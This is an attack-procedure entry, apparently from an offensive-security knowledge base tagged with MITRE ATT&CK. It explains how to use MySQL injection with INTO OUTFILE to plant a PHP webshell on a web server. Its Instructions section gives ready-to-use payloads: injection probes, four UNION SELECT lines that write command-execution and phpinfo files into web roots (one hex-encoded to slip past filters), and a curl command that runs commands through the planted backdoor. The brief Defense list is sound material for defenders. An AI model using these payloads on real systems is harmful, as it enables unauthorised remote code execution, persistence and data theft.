---
id: a114bef7-dedd-4a6c-99e7-6bfac6f546e6
name: MySQL-Injection-Write-Shell-Using-Outfile-Method
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.815745+00:00'
updated_at: '2023-04-10T20:22:49.769833+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques:
  - '[[sub-techniques/Unix-Shell|T1059.004 - Unix Shell]]'
  - '[[sub-techniques/Windows-Command-Shell|T1059.003 - Windows Command Shell]]'
tags:
  - '[[tags/Into-outfile-method]]'
  - '[[tags/MySQL-Injection]]'
  - '[[tags/MySQL-Write-a-shell]]'
commands: []
platforms:
  - Web
  - Linux
  - Windows
tools: []
validated: true
---

# MySQL-Injection-Write-Shell-Using-Outfile-Method

## Summary

This procedure exploits a SQL injection vulnerability in a MySQL database to write a malicious PHP webshell to the target web server's filesystem using the INTO OUTFILE clause. The webshell allows remote command execution, enabling further post-exploitation activities such as privilege escalation or data exfiltration.

## Description

SQL injection (SQLi) attacks target applications that fail to properly sanitize user inputs in SQL queries, allowing attackers to inject malicious SQL code. In this technique, the attacker appends a UNION SELECT statement to the original query, using MySQL's INTO OUTFILE to write query results directly to a file on the server. The results contain PHP code for a simple webshell that executes system commands via HTTP GET parameters (e.g., ?cmd=<command>). This is effective against web applications running on Apache/Nginx with PHP and MySQL, where the database user has FILE privileges. Success depends on the web root directory being writable and known paths like /var/www/html or C:\xampp\htdocs. Once written, the attacker accesses the shell via a browser or curl to execute OS commands, mapping to execution tactics by hijacking the web server's scripting interpreter.

## Requirements

1. Valid SQL injection point in a web application parameter (e.g., login form, search field).
2. MySQL database version supporting INTO OUTFILE (most versions do, but FILE privilege required for the DB user).
3. Knowledge of the web server's document root (e.g., /var/www/html on Linux, C:\xampp\htdocs on Windows).
4. Network access to the vulnerable application and the written shell's URL.
5. Optional: Intercepting proxy like Burp Suite for crafting requests.

## Defense

- Use prepared statements and parameterized queries to prevent SQL injection.
- Limit MySQL user privileges by revoking FILE permission unless necessary.
- Implement web application firewalls (WAF) to detect anomalous SQL patterns.
- Monitor filesystem for unexpected PHP files in web roots and log SQL queries for anomalies.
- Regularly audit database configurations and application inputs.

## Objectives

1. Exploit SQL injection to write a PHP webshell to the server's filesystem.
2. Gain remote code execution capability via the webshell.
3. Enable further access for data exfiltration or persistence on the target system.

## Instructions

### Step 1: Identify and Confirm SQL Injection Vulnerability

**Context**: Locate a parameter vulnerable to SQLi (e.g., via error-based or union-based tests) and confirm the number of columns for UNION SELECT.

Use manual testing or a proxy to inject payloads like ' OR 1=1 -- to bypass authentication or UNION SELECT 1,2,3 -- to determine injectable columns. Ensure the query returns data without errors.

> Expected: Application echoes injected values or reveals database info (e.g., version via SELECT @@version).

### Step 2: Craft and Inject the INTO OUTFILE Payload

**Context**: Append a UNION SELECT to write PHP webshell code to a known web-accessible path. Replace [...] with the vulnerable query prefix and adjust paths based on OS.

**Code** ([[codes/MySQL-Union-Select-Outfile-PHP-Shell]]):

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

> Inject via the vulnerable parameter (e.g., in a GET/POST request). Variations target different OS and shell types: command execution or phpinfo disclosure. Use hex encoding (0x...) to bypass filters.

### Step 3: Verify Webshell Deployment and Test Execution

**Context**: Access the written file via HTTP and test command execution to confirm control.

Navigate to the shell URL (e.g., http://target.com/backdoor.php?cmd=whoami) in a browser or use curl:

```bash
curl "http://target.com/backdoor.php?cmd=id"
```

> Expected: Output of the command (e.g., uid=33(www-data) on Linux). If phpinfo variant, access without params to view server config.

**Success Indicators**:
- New PHP file appears in web root (check via directory listing if possible).
- Command output returned without SQL errors.
- No permission denied on file write.
